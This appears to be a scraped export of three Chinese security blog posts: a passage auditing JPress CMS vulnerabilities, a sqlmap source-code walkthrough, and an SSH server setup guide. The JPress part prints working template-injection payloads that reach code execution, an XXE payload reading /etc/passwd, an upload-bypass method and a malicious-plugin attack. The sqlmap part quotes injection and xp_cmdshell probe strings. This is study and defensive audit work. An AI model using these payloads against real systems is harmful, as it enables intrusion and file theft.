#(comment.id) 处的两个值。\n\n\n\n而漏洞的触发点实际上是在同一行语句的 renderToString() 方法下。\n\n\n\n跟进 render() 方法\n\n\n发现里面存在一个危险方法 exec()，跟进一下，在 exec() 方法当中对输入的评论进行遍历。\n\n\n连续跟进一下，会到 com.jfinal.template.expr.ast.Method 这个类的 eval() 方法下，对应的调用栈如下\neval:81, Method (com.jfinal.template.expr.ast)\nassignVariable:102, Assign (com.jfinal.template.expr.ast)\neval:95, Assign (com.jfinal.template.expr.ast)\nexec:57, Set (com.jfinal.template.stat.ast)\nexec:68, StatList (com.jfinal.template.stat.ast)\nrender:74, Template (com.jfinal.template)\nrenderToString:91, Template (com.jfinal.template)\ndoSendEmail:91, ArticleNotifyKit (io.jpress.module.article.kit)\nlambda$byEmail$16:70, ArticleNotifyKit (io.jpress.module.article.kit)\nrun:-1, 1607068801 (io.jpress.module.article.kit.ArticleNotifyKit$$Lambda$79)\nrunWorker:1142, ThreadPoolExecutor (java.util.concurrent)\nrun:617, ThreadPoolExecutor$Worker (java.util.concurrent)\nrun:745, Thread (java.lang)\n\n此处就可以很明显的看到存在反射调用任意类的命令执行漏洞\n\n\n在 Velocity 这个模板引擎当中非常奇妙，先从模板引擎说起，师傅们都知道模板引擎有时候是可以写脚本的，可以进行一些简单的赋值与输出这类的操作。\n在 Velocity 中 &quot;#&quot; 用来标识 Velocity 的脚本语句，包括 #set、#if 、#else、#end、#foreach、#end、#iinclude、#parse、#macro 等；  \n如：\n#if($info.imgs) \n&lt;img src=\"$info.imgs\" border=0> \n#else \n&lt;img src=\"noPhoto.jpg\"> \n#end\n\n那么在这一个 PoC 当中，我们可以借助 Fastjson 的特性辅助攻击。\n\n构造 PoC 如下，并将它插入到评论的内容当中。\n\n#set(x=net.sf.ehcache.util.ClassLoaderUtil::createNewInstance(\"javax.script.ScriptEngineManager\"))\n#set(e=x.getEngineByName(\"js\"))\n#(e.eval('java.lang.Runtime.getRuntime().exec(\"calc\")'))\n\n\n\n按照道理来说，这里前台只要输入任意的东西，就可以造成 SSTI To RCE 这么一个效果，但是这里却抛出了异常，具体位置是在 renderToString() 方法调用之后抛出了异常，如图。\n\n\n仔细看一下报错信息：其实是在说，第三行的地方存在着不合法的字符，这个字符其实是单引号。\n\n\n所以这里我们需要用另外一种方式来打，尝试不使用引号构造 payload，构造出了如下 payload，我们将字符串内容通过评论内容进行传入\n#set(str=comment.content)\n#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance()) \n#(x.setAutoTypeSupport(true)) \n#set(sem=str.substring(0, str.indexOf(124)))\n#set(str=str.substring(str.indexOf(124)+1))\n#(x.addAccept(sem)) \n#set(json=str.substring(0, str.indexOf(124)))\n#set(str=str.substring(str.indexOf(124)+1))\n#set(x=com.alibaba.fastjson.JSON::parse(json))\n#set(js=str.substring(0, str.indexOf(124)))\n#set(str=str.substring(str.indexOf(124)+1))\n#set(e=x.getEngineByName(js)) \n#(e.eval(str))\n\n因为后端在渲染模板时将 comment 对象传入了，所以我们可以获取 comment.content，而这个值又是在评论时可控的，配合 Fastjson 打。\n在评论的地方构造 payload\njavax.script.ScriptEngineManager|&#123;\"@type\":\"javax.script.ScriptEngineManager\"&#125;|js|java.lang.Runtime.getRuntime().exec(\"calc\")\n\n\n\n攻击成功！\n\n\n漏洞修复我认为的修复方式会比较贴近于 Velocity 的一些修复方式，而 Velocity 到目前最新版本也没有提供沙盒或者防御方式，只能禁止或严格过滤用户输入进入 Velocity.evaluate。但是这一框架是作者团队自己编写的，并非 Velocity\n但是在这一个项目当中，我们可以去看一下 jpress V5.0.5 的版本当中是如何修复的，这个地方当时自己找的时候花了很久时间。\njpress V5.0.5，也就是最新版本当中，是通过转义字符来修补这个漏洞的。挺妙的，代码量小且利用效率高，很强。它的修补手段是在 getPara() 方法处先做一个转义，具体代码的调用栈如下\ncleanXss:79, XSSHttpServletRequestWrapper (io.jboot.web.xss)\ngetParameter:32, XSSHttpServletRequestWrapper (io.jboot.web.xss)\ngetParameter:161, ServletRequestWrapper (javax.servlet)\ngetPara:189, Controller (com.jfinal.core)\npostComment:148, ArticleController (io.jpress.module.article.controller.front)\n\n\n\n跟进 escapeHtml() 方法，它调用了 replaceEach() 方法，replaceEach() 方法做了转义恶意字符的工作，有兴趣的师傅们可以跟进自行调试一下，很简单。\n\n\n前台任意文件上传漏洞影响接口&#x2F;ucenter&#x2F;avatar\n\n漏洞影响域在 /ucenter/avatar 下，这里对应的接口找了很久，最后终于找到是在 io.jpress.web.commons.controller.AttachmentController#upload 处\n漏洞分析产生漏洞的根本原因是，Web 应用程序允许上传一个 file[] 数组，而非单个文件，从而我们可以构造多个文件同时上传来绕过。\n\n\n\n\n直接讲代码非常抽象，我们这里先上 payload 打，通过上传多个文件，使后续的文件绕过恶意文件的判断\n\n\n攻击的效果是在 /attachment 文件夹下，能够上传我们的恶意文件，同样能够访问得到。但是这里有个小问题，我尝试上传 jsp 与 jspx 来写🐎，发现无法上传，但是上传 .war 和 .jar 都是可行的，有点奇怪（留个坑）\n\n具体的运行流程分析如下，先把断点下在 upload() 方法处\n\n一开始获取文件，并将第 0 个元素赋给 file\n\n\n在执行完 getFile 之后，可以看到，我们上传的文件已经被保存到了临时文件目录，也就是 attachment 目录下，这其实就是一个暂存的动作。\n\n\n紧接着，在65行，判断了文件是否合法，不合法就删除，对应的黑名单在 unSafe() 方法里面。\n\n\n接着往下走，进行了是否是 image 这个类型的判断，如果是 image 这个类型，则会限制上传的 image 大小。\n\n\n至此对于上传文件的限制就结束了，所以我们看到程序对于多个文件的上传并未做严格的限制。通过上传多个文件可以绕过黑名单的判断。\n\n这个洞非常有意思，不仅给了 file 为数组的时候的绕过手段，在日后的渗透当中，也可以将 file 修改为 file[] 来攻击。\n\n漏洞修复\n此处我的想法是不允许将 file 以数组的形式上传\n\n至于官方的修复也很妙，官方的修复方式是对业务影响最小的修复方式，我们可以来看一看 jpress V5.0.5 的代码\n\n\n先判断在数组文件当中，是否只有一个文件，如果只有一个文件，那么就通过 get(0) 获取到它，如果有多个文件，就将多个文件直接执行 delete 操作。\n妙！\n插件安装处存在命令执行漏洞影响接口admin/addon/install\n\n漏洞分析此处允许我们上传 jar 包，并不是允许上传 jar 包就一定会存在漏洞，具体漏洞的情况还要看内部有没有进行一些过滤的手法。\n找了很久对应的接口，最后发现是在 io.jpress.web.admin._AddonController 的doUploadAndInstall() 方法下做的对应业务。\n下个断点，我们先编写一个恶意的 jar 包，接着上传，开始调试。\n\n\n因为这也是一个文件上传点，所以依旧会存在多个文件绕过的方式。我们继续往下看，在获取到文件后，会判断是否是 zip 或是 jar 的文件类型。\n\n\n继续往下，关键语句在 readSimpleAddonInfo() 处，readSimpleAddonInfo() 方法会把我们所有的东西保存到一个 Zip 包里面，当然 jar 包后续会打包成 jar 包。\n继续往下走，到第 118 行，这一个 install() 方法相当关键。\n\n\n跟进一下，它会走到 AddonManager#install，也就是开始执行 jar 包的插件安装，在第 206 行，跟进 readAddonInfo() 方法，跟进一下\n\n\n在这个方法里面会创建一个类加载器来加载插件里的类，这里又复用了一遍 readSimpleAddonInfo() 方法\n\n\n跟进 classLoader.load()，这个方法的作用就是先加载类，然后把不同的类进行归类，Controller 归到一起，Interceptor 归到一起\n先加载类\n\n\n然后根据类的功能进行归类，把他们分别添加到了 addonInfo 的特定字段当中\n\n\n接下来在处理请求时就会利用到这些 controller，从而实现攻击。现在对于我们来说，访问 helloworld 这一个 controller 即可。执行命令执行。\n\n\n漏洞修复\n官方作者这里并没有给出对应的修复方法……对应的解释如下\n\n“不处理这个问题，原因是：1、必须获得 JPress 的后台登录地址，虽然有默认的登录地址，但是可配置成其他复杂的地址2、拥有登录地址后，必须有管理员的账号和密码，这种一般只有设置了弱密码，或者管理员主动泄漏。3、安装了 恶意 的插件\n而目前 Java 行业凡是对于可以安装插件的产品来讲，都是无法避免这个问题的。这个需要网站管理提高安全意识、设置复杂的登录地址和登录账号密码，不轻易安装不认可的插件即可解决。这种由于安全意识造成的问题，并非软件问题。”\n\n其实还是蛮能理解的……\n\n所以此处我认为并没有比较合适的修复手段……\n模板安装处存在命令执行漏洞影响接口admin/template/install\n\n漏洞分析断点下在 io.jpress.web.admin._TemplateController 下的 doInstall() 方法，上传一个恶意的 zip 文件，开始调试。\n一开始会进行判断，是否为 zip 文件\n\n\n经过一系列判断之后，到 155 行，155 行这里实际上做了一个文件 move 的操作，将文件先 “暂存”到了对应的文件夹下；到 156 行，进行 zip 压缩包的解压。\n\n\n具体的业务就不看了，比较简单，有兴趣的师傅可以跟着调试一下。\n在这之后，evil.zip 就成功被解析成 evil 文件夹，并保存到了对应的文件夹下。\n\n\n不过模板注入存在些许过滤，我们使用 Fastjson 来辅助获取 ScriptEngineManager，然后执行任意 js 代码，就可以实现 rce，payload 如下\n#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance()) \n#(x.setAutoTypeSupport(true)) \n#(x.addAccept(\"javax.script.ScriptEngineManager\")) \n#set(x=com.alibaba.fastjson.JSON::parse('&#123;\"@type\":\"javax.script.ScriptEngineManager\"&#125;'))\n#set(e=x.getEngineByName(\"js\")) \n#(e.eval('java.lang.Runtime.getRuntime().exec(\"calc\")'))\n\n后台这个地方存在一个模板预览功能，这就用到了利用方式\n\n\n开启之后可以通过 get 传入 template 参数来指定使用的模板，比如这里我们指定使用 cn.jeanstudio.bonhumeur 这个模板。而因为我们上传的是一个 html，所以我们可以直接访问 evil&#x2F;?template&#x3D;evil 来攻击\n\n\n漏洞修复这里漏洞修复的方法比较巧妙，它禁止了在 html 中使用 #set 的调用，所以我们恶意的 payload 无法打成功，对应的过滤语句我没有找到，如果有师傅找到了请指点一下我（我太菜了www\n从 WordPress 中导入文章功能存在 XXE 漏洞(在对应的低版本可以，V4.2 不行)影响接口/admin/setting/tools/wordpress\n\n漏洞分析对应的业务点在 io.jpress.module.article.controller.admin._WordpressImport#doWordPressImport 处\n同样，这也是一个文件上传点，前面的就不看了，直接看 xml 解析的部分。\n\n\n跟进 wordPressXmlParser.parse()，里面就是正常的 XML 解析业务，但同时可以发现，此处禁止了 DTD 的使用，所以 V4.2 版本这里是不存在漏洞的。我们来看一看 V4.1.2 也就是存在漏洞的版本中的代码。\n\n\nV 4.1.2 版本当中未过滤任意 DTD，所以能够造成 XXE 漏洞攻击。\npayload 如下：\n&lt;?xml version = \"1.0\"?>\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY f SYSTEM \"file:///etc/passwd\">\n]>\n\n&lt;item>\n&lt;wp:post_type>post&lt;/wp:post_type>\n&lt;title>2&lt;/title>\n&lt;content:encoded>&amp;f;&lt;/content:encoded>\n&lt;wp:status>draft&lt;/wp:status>\n&lt;/item>\n\n漏洞修复禁用 DTD，代码可以参照 V4.2 版本的当中的\nSAXParserFactory factory = SAXParserFactory.newInstance();\n            factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n            factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n            factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n            factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n            factory.setXIncludeAware(false);\n\n模板编辑处存在存储型 XSS(在对应的低版本可以，V4.2 不行)影响接口admin/template/setting\n以及多个模板编辑处，此处不列举\n\n漏洞分析在对应的接口处插入 XSS 语句\n\n\n在前端界面处可以直接产生 XSS 的效果\n\n\n\n作者的意思是这里本身就允许编辑代码，所以并非属于漏洞。\n\n漏洞修复作者虽然比较“嘴硬”说了本身就允许编辑代码，所以并非属于漏洞，但还是偷偷把这个洞给修了（雾）\n作者这里的修复方法是加白，也就是说虽然这确实允许编辑代码，但是像 alert()、svg 这一种标签就不允许过，仅能过一些 h1、h2 这种非恶意标签。\n0x04 小结\n在 jpress 当中存在的漏洞主要是因为过于信任用户的输入，同时给出的一些修复思路非常有趣，是一个很好的代码审计 CMS\n\n0x05 参考链接https://github.com/JPressProjects/jpress/issues以及 Erc111111 师傅的帮助 ———— https://er1cccc.gitee.io/r2/\n","categories":["代码审计"],"tags":["Java","代码审计"]},{"title":"sqlmap 源码阅读","url":"/2023/01/19/sqlmap-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","content":"sqlmap 源码阅读\n\n0x01 前言还是代码功底太差，所以想尝试阅读 sqlmap 源码一下，并且自己用 golang 重构，到后面会进行 ysoserial 的改写；以及 xray 的重构，当然那个应该会很多参考 cel-go 项目\n0x02 环境准备sqlmap 的项目地址：https://github.com/sqlmapproject/sqlmap用 pycharm 打断点调试，因为 vscode 用来调试比较麻烦。\n因为要动调，所以需要一个 sql 注入的靶场，这里直接选用的是 sql-labs，用 docker 起\ndocker pull acgpiano/sqli-labs\ndocker run -dt --name sqli-lab -p [PORT]:80 acgpiano/sqli-labs:latest\n\n最后还需要重新配置一下数据库，然后才能以 sqli-labs 为靶场进行测试。\n这里也挂一下 sqlmap 对应的一些基础操作 ———— https://www.cnblogs.com/hongfei/p/3872156.html\n\n\n直接在 pycharm 的 Debug 下进行调试，设置参数如下，开始调试\n-u \"http://81.68.120.14:3333/Less-1/?id=1\" -technique=E --dbs\n\n0x03 sqlmap 源码阅读在开始之前我们有必要确认一下 sqlmap 运行的流程图，很重要！这样有助于我们进一步分析源码。\n\n\n1. 初始化在 sqlmap.py 的 main 函数下断点，开始调试\n在没有对 URL 进行发包&#x2F;探测的时候 sqlmap 会先对一些环境、依赖、变量来做一些初始化的处理\n\n\n往下，通过 cmdLineParser() 获取参数，cmdLineParser() 通过 argparse 库进行 CLI 的打印与获取，类似的一个小项目我之前也有接触过  https://github.com/Drun1baby/EasyScan\n往下 initOptions(cmdLineOptions) 解析命令行参数\ninit 函数： 初始化\n在 init() 函数中通过调用各种函数进行参数的设置、payload 的加载等，有兴趣的师傅可以点进去阅读一下。\n\n\n其中这三个相对比较重要，是用来加载 payload 的 ———— loadBoundaries()、loadPayloads()、_loadQueries()，\nloadBoundaries()  // 加载闭合符集合\nloadPayloads()    // 加载 payload 集合\n_loadQueries()    // 加载查询语句，在检测到注入点之后后续进行数据库库名字段名爆破会用到的语句\n\n下个断先点调试一下 loadBoundaries() 函数\n\n\n首先，会去加载 paths.BOUNDARIES_XML，也就是 data/xml/boundaries.xml\n\n\n接着进入解析 XML 文件的部分，跟进 parseXmlNode(root)\n\n\n最终添加到 conf 对象的 tests 属性里\n\n\n\nloadPayloads() 函数与 _loadQueries() 函数大体上也是如此，都是做了解析 xml 文件的工作，再将内容保存到 conf 对象的 tests 属性里。像 loadPayloads() 函数，最后在 conf.tests 里面可以很清晰的看到 payloads\n\n\n\n此时我们还可以看一下 conf 是什么\n\n\nconf 属性中主要存储了一些目标的相关信息（hostname、path、请求参数等等）以及一些配置信息，init 加载的 payload、请求头 header、cookie 等\ninit() 函数执行完毕后，就会来到 start() 函数进行项目的正式运行。\n\n\n初始化功能点小结\n简单概括一下初始化部分的代码做了什么事\n\n\n获取命令行参数并处理\n初始化全局变量 conf 以及 kb\n获取并解析几个 xml 文件，完成闭合工作、payloads 加载工作\n设置 HTTP 相关配置，如 HTTP Header，UA，Session 等\n\n2. URL 处理f8 下来，先到的是 threadData = getCurrentThreadData()，继续往下走，到 result = f(*args, **kwargs) 代码块，跟进一下\n\n\n代码逻辑此时来到了 /lib/controller/controller.py 下，往下走，是不会进到 conf.direct 和 conf.hashFile 中的，会直接进入到 kb.targets.add() 的代码逻辑里面。\n\n\n此处的 kb 变量的作用是共享一些对象，其实本质上是保存了注入时的一些参数。kb.targets 添加了我们输入的参数，如图\n\n\n往下看，大体上是做了一些类似类似打印日志、赋值、添加 HTTP Header 等工作，这一部分代码我们就不看了，直接看最关键的这一部分代码 parseTargetUrl()。\n\n\n跟进\n\n\n一开始先进行了这一判断\nif re.search(r\"://\\[.+\\]\", conf.url) and not socket.has_ipv6\n\n判断 http:// 的开头形式是否正确，以及 socket 是否为 ipv6 协议，如果为 ipv6 协议，那么 sqlmap 并不支持。\n接着判断\nif not re.search(r\"^(http|ws)s?://\", conf.url, re.I):\n\n判断是 http 开头还是 https 开头，又或者是否是 ws&#x2F;wss 开头，如果没有这些开头，则就从端口判断，这里我认为或许可以加上 80 与 8080 端口。\n\n\n继续往下看，进行了 url 的拆分、host 的拆分，并将这些内容保存到 conf 里面的对应属性，后续也是一些基础的判断与赋值，这里不再赘述。\n\n\n\n总而言之是在对 URL 进行剖析与拆解，最后这些东西都是放到 conf 里面的\n\n3. 如果这个网站已经被注入过，生成注入检测的payload核心代码在 controller.py 的第 434 行，需跟进；此处我们可以设置对 kb.injections 的变量监测。先跟进 setupTargetEnv() 函数\n\n\n\nsetupTargetEnv() 函数调用了如下图所示的七个函数\n\n\n\n我们跟进最主要的 _resumeHashDBValues() 函数，首先调用了 hashDBRetrieve() 函数，设置检索\n\n\n出来，到第 476 行，这一次又调用了 hashDBRetrieve() 函数，传参是 HASHDB_KEYS.KB_INJECTIONS，意思就是以 KB_INJECTIONS 作为 KEY 进行检索。跟进发现函数先将需要注入的 URL 信息放到了 _这个变量中，并将基础信息用 | 符号隔开。\n\n\n跟进 retrieve() 函数，这个函数做了生成 payload 的工作，具体是怎么生成的我们继续往下看\n\n\n第 95 行，这里很重要，执行了 SQL 语句，并通过 Hash 加密，加密方式是 base64Pickle 序列化\n\n\n最终反序列化解密 Payload，说实话这里没看懂是怎么生成的，看上去仅仅是执行了一个 SQL 语句，后面看其他师傅的文章的时候并没有把这一段单独拉出来说，payloads 其实都放在 xml 当中。\n\n\n接着再循环一次，生成一个 payload\n在生成完所有 payload 之后会先对目标进行一次探测，如果 Connection refused 则返回 False\n\n\n这里生成的 payload 只是很基础的一部分，并非是\n4. WAF 检测解析完 URL 之后对目标进行探测，往下看，位置是 controller.py 的第 439 行，第 448 行有 checkWaf() 的函数，很明显就是要做 WAF 检测的功能。\n\n\n先会判断这一目标是否存在 WAF，如果存在 WAF 的话，会进行字符的相关 fuzz，当然此处建议对一个存在 WAF 的目标进行测试。值得注意的是，如果这个目标你已经探测过存在 waf，且已知 waf 归属厂商的情况下，就不会走到 payload 那一段代码逻辑当中去，相关的业务代码在 hashDBRetrieve() 下，此处不再展开，比较容易。\n\n\n如果存在 WAF，则会生成用于 fuzz 的 payload，这个 payload 是基于这个 NMAP 的 http-waf-detect.nse ———— https://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse\n设置 payload 类似于 &quot;9283 AND 1=1 UNION ALL SELECT 1,NULL,&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(&#39;cat ../../../etc/passwd&#39;)#&quot;，如果没有 WAF，页面不会变化，如果有 WAF，因为 payload 中有很多敏感字符，大多数时候页面都会发生改变。\n接下来的 conf.identifyWaf 代表 sqlmap 的参数 --identify-waf,如果指定了此参数，就会进入 identifyWaf() 函数，主要检测的 waf 都在 sqlmap 的 waf 目录下。不过新版的 sqlmap 已经将这一参数的功能自动放到里面了，无需再指定参数\n\n这里的 payload 先经过处理后赋值给 value，再将 value 作为参数传入 queryPage() 请求中，跟进\n\n\n\n在经过很长一段的数据处理与判断代码后，我们到第 1531 行，如图，跟进；getPage() 函数的作用是获取界面的一些信息，如 url，ua，host 等，通过输出比对 payload，为判断 waf 类型提供信息。\n\n\n\n获取基本信息\n\n\n\n这些基础信息最后都会保存在 response 系列的 message 当中\n\n\ngetPage() 函数中调用了 processResponse() 函数做响应结果的处理，跟进\n\n\n往下看，到 401 行开始，后续的代码进行了 Waf 的识别\n\n\n跟进 identYwaf.non_blind_check()，是通过正则表达式来对页面进行匹配，对应的规则在 thirdparty/identywaf/data.json 中\n\n\n\n\n同时 sqlmap 不光通过规则库来进行判断，也会通过页面相似度来判断是否存在 waf/ips\n\n\n如果相似度小于设定的 0.5 那么就判定为有 waf 拦截\n\n\nWAF 注入总结总结一下就是两点，一种方法是通过正则匹配的检测，另外一种方法是根据页面相似度来检测，我自己应该很难写出来 waf 检测的东西；届时再做尝试。\n5. 注入检测之启发式注入从 checkWaf()  函数里面出来，先到第 457 行，检测网站是否稳定（因为有些网站一测试可能就炸了）对应此 info\n[INFO] testing if the target URL content is stable\n\n\n\n继续往下走到第 471 行，会先判断参数是否可以注入，这里与命令的参数 —— --level 挂钩\n\n\n在前文环境准备的时候我们采用的方式是报错注入，如果不这么做，直接指定参数 --dbs，无法进入到启发式注入里面。我们接着看代码，往下直到第 581 行，调用的 heuristicCheckSqlInjection() 函数，意思是启发性注入。\n\n\n\n启发式注入做了哪些工作\n\n1、数据库版本的识别2、绝对路径获取3、XSS 的测试\n数据库版本的识别首先会从 HEURISTIC_CHECK_ALPHABET 中随机抽取10个字符出现构造 Payload，当然里面的都不是些普通的字符，而且些特殊字符，当我们进行 SQL 注入测试的时候会很习惯的在参数后面加个分号啊什么的，又或者是其他一些特殊的字符，出现运气好的话有可能会暴出数据的相关错误信息，而那个时候我们就可以根据所暴出的相关错误信息去猜测当前目标的数据库是什么。\n并且最后生成的这个 payload 是能够闭合的\n\n\n实际找个网站测试，如图，这就是报出的 SQL 数据库错误\n\n\n判断在 lib/request/connect.py 的 1532 行\n\n\n接着跟进 processResponse() 函数，这里和 waf 对比用的同一种方式，不再详细说明\n\n\n其中 processResponse() 会调用到 ./lib/parse/html.py 中的 htmlParser() 函数，这一个函数就是根据不同的数据库指纹去识别当前的数据库究竟是什么。\n\n\n\n\n最终实现这一功能的其实是 HTMLHandler 这个类，errors.xml 文件内容如图\n\n\n这一配置文件的比较简单，其实也就是一些对应数据库的正则。sqlmap 在解析 errors.xml 的时候，然后根据 regexp 中的正则去匹配当前的页面信息然后去确定当前的数据库。这一步和 WAF 比对类似。\n到此 sqlmap 就可以确定数据的版本了，从而选择对应的测试 Payload，后续我们会看到这是根据莫索引将 payloads 排序，然后选取对应数据库信息的 payloads 进行测试。减少 sqlmap 的扫描时间。\n\n最后这个 DBMS 探测对应的是这一段信息\n\n\n\n获取绝对路径与 XSS 探测相比指纹识别，获取绝对路径的功能模块相对简单，利用正则匹配寻找出绝对路径。\n\n\nXSS 的探测也比较简单，这里就不作代码分析了\n\n\n6. 注入检测之正式注入从启发式注入里面出来，到第 592 行，进行正式的注入检测，跟进\n\n\n到第 130 行，获取所有的 payload，后续会根据数据库的信息构建索引，将符合索引的 payload 拿去攻击\n\n\n往下走，先判断有没有做数据库信息的获取，如果有则跳过，如果没有就先进行上一步的启发式注入\n\n\n接着根据通过报错得到的数据库信息建立索引，将对应最有效的 payload 拿出来。这些 payloads 会进行 while 循环\n\n\n第 370 行，通过 cleanupPayload() 函数对 payload 进行处理，主要功能其实是做了 payload 的标签替换\n\n\n最后替换过的 payload 长这样\n\"AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('qbpxq',(SELECT (ELT(9125=9125,1))),'qxkvq','x'))s), 8446744073709551610, 8446744073709551610)))\"\n\n在 sqlmap 中将payload 分为了三部分，上面生成的 fstpayload 就是中间那部分\nprefix + payload + suffix \n\nprefix 和 suffix 就是对应的，闭合前面的结合以及注释后面的结构，这两个属性主要是从 boundary 中进行获取的，boundary 就是前面加载的 boundaries.xml 配置文件，用来闭合的，所以这里作为了 prefix 和 suffix\n\n\n最后的拼接\n\n\n并分别对 prefix 和 suffix 进行 clean，然后进行组合，组合之后的 payload 就是 reqPayload，然后进行请求\n\n\n\n发出请求最终还是通过 request.queryPage() 来实现的\n\n请求完毕的结果经过 queryPage() 函数来获取界面，但是页面结果是由 kb.chars.start 和 kb.chars.stop 包裹着的\n\n\n\n\n当第一次的注入不成功的时候，会不断变更 prefix，suffix，当 prefix 和 suffix 都变更完毕但还是无法注入时，才会变更 payload，取出另一个 payload 出来，直至 injectable 变量为 true，同时 output=1\n\n\n并且 injectable=true\n\n\n7. 爆数据库等操作经过上一步正式注入的判断，得到的 injectable=true 参数，才能进行下一步的爆数据库操作.\n爆库阶段主要是先经过四个函数处理数据后，再调用 action() 函数，跟进。\n\n\n这里已爆库为例，先看 --dbs 参数有关的这一块，核心函数是 getDbs()\n\n\n先根据后台数据库信息，输出日志\n\n\n第 133 行，queries 就是存放之前初始化 queries.xml 的变量\n\n\n首先通过 count(schema_name) 来获取数据库的个数，然后再通过 limit num,1 来依次获取数据库名，从 queries 变量中获取语句之后就会传递到 getValue 函数\n\n\n跟进，前面做了一些基础的设置和 payload 的处理与赋值，比如第 401 行的 cleanQuery() 函数，将语句转换为大写，这里我就不跟进了。直接看关键语句，第 451 行，errorUse() 函数\n\n\n在 errorUse() 中首先通过正则将 payload 中的各个部分都进行了获取 ，保存到了对应的 field 当中，最终经过一系列处理，取出了 payload 中的 schema_name\n\n\n跳出 getFields() 函数，往下，将 expression 的值经过 replace 操作，赋值给了 countedExpression，最终得到的值是 &#39;SELECT COUNT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA&#39;\n\n\n第 337 行，跟进 _oneShotErrorUse() 函数，在这一个函数中，sqlmap 对目标网站发包，使用的 payload 为 countedExpression，目的是探测数据库个数（count）\n\n\n具体业务发包在这里\n\n\n最后将结果传入 extractRegexResult() 函数中进行正则提取\n\n\n多线程的方式进行注入，而 runThreads() 函数调用了 errorThread() 函数，最终的注入业务还是由 errorThread() 函数来完成的\n\n\n\n\n跟进一下 _errorFields() 函数，将每一个表进行 while 循环操作，再通过 limitQuery() 函数设置最后的 Limit 语句\n\n\n最后成功 --dbs\n\n\n\nsqlmap 流程分析结束\n\n0x04 小结sqlmap 的流程分析需要非常重视这张图，当感觉代码看不下去的时候看一下这张图可以事半功倍。\n\n\n在审计开始之前也可以看一下 utils 文件夹下的 python 文件，总体来说流程并不难，看正则的时候其实挺吃力的。\n0x05 Referencehttp://wjlshare.com/archives/1733https://wooyun.js.org/drops/SQLMAP%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90Part1.%E6%B5%81%E7%A8%8B%E7%AF%87.html\n","categories":["工具开发&编写"],"tags":["工具开发&编写"]},{"title":"ssh服务器的搭建","url":"/2021/07/14/ssh%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/","content":"ssh服务器的搭建\n\nssh服务器的搭建\n1.安装ssh服务器\n\nsudo apt-get install openssh-server\n\n查看ssh服务器是否安装成功：\nssh -V\n\n\n2.查看ssh配置文件：vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config\n\n\n用vim进行编辑：\n\n设置成如下：\n# Authentication:\nLoginGraceTime 120\nPermitRootLogin prohibit-password\nStrictModes yes\n\nRSAAuthentication yes\nPubkeyAuthentication yes\n#AuthorizedKeysFile %h/.ssh/authorized_keys\n\n# Don't read the user's ~/.rhosts and ~/.shosts files\nIgnoreRhosts yes\n# For this to work you will also need host keys in /etc/ssh_known_hosts\nRhostsRSAAuthentication no\n# similar for protocol version 2\nHostbasedAuthentication no\n# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication\n#IgnoreUserKnownHosts yes\n\n# To enable empty passwords, change to yes (NOT RECOMMENDED)\nPermitEmptyPasswords no\n\n\n\n其中，主要是：\nPermitEmptyPasswords no\nPermitRootLogin prohibit-password\n\n使得无密码通过或者是按照服务器的密码登录\n\n用ssh客户端登录：\n\nssh 用户名@需要登录的机器的IP\n\n\n以超级管理员身份登录：\n\nssh root@需要登录的机器的IP\n\n\n\n\n当第一次登陆某服务器时：\n\n会出现这些代码：\n\nThe authenticity of host 'foo.com (192.168.121.111)' can't be established.\nECDSA key fingerprint is SHA256:Vybt22mVXuNuB5unE++yowF7lgA/9/2bLSiO3qmYWBY.\nAre you sure you want to continue connecting (yes/no)?\n\n\n这时候出现的这个是我们所谓的密钥，同时，不同的算法对应不同的密码与密钥（密码学拓展）\n\n那么这里如果光输入”yes”  然后再进行进一步的操作——也就是输入你的服务器密码时，是不会接通的。\n我们将出现过的这个东西：\nECDSA key fingerprint is SHA256:Vybt22mVXuNuB5unE++yowF7lgA/9/2bLSiO3qmYWBY.\n\n\n称为指纹\n\n类比于指纹，这是一个新的指纹，如何让它能够解锁：\n\n那当然是将它加入到你的指纹中啦，也就是给予它信任：\n\n$ ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub\n256 da:24:43:0b:2e:c1:3f:a1:84:13:92:01:52:b4:84:ff   (ECDSA)\n\n上面的例子中，ssh-keygen -l -f命令会输出公钥/etc/ssh/ssh_host_ecdsa_key.pub的指纹。\nssh 会将本机连接过的所有服务器公钥的指纹，都储存在本机的~/.ssh/known_hosts文件中。每次连接服务器时，通过该文件判断是否为陌生主机（陌生公钥）。\n在上面这段文字后面，输入yes，就可以将当前服务器的指纹也储存在本机~/.ssh/known_hosts文件中，并显示下面的提示。以后再连接的时候，就不会再出现警告了。\nWarning: Permanently added 'foo.com (192.168.121.111)' (RSA) to the list of known hosts\n\n\n\n0x01可能会出现的问题：ssh: connect to host 192.168.241.128 port 22: Connection refused\n\n\n解决方法：是因为没有打开ssh服务：\n\n我们用这个命令查看：\n\n\n\nservice ssh status\n\n\n得到的结果：\n\nssh.service - OpenBSD Secure Shell server\n     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)\n     Active: inactive (dead)\n       Docs: man:sshd(8)\n             man:sshd_config(5)\n\n\n我们发现这一行：\n\nActive: inactive (dead) #状态：inactive\n\n\n那么也就是我们需要激活ssh服务\n\nservice ssh start\n\n启用ssh服务后：再一次运行\nservice ssh status\n\n这次得到的结果：\nssh.service - OpenBSD Secure Shell server\n     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)\n     Active: active (running) since Thu 2020-12-24 06:58:16 EST; 2s ago\n       Docs: man:sshd(8)\n             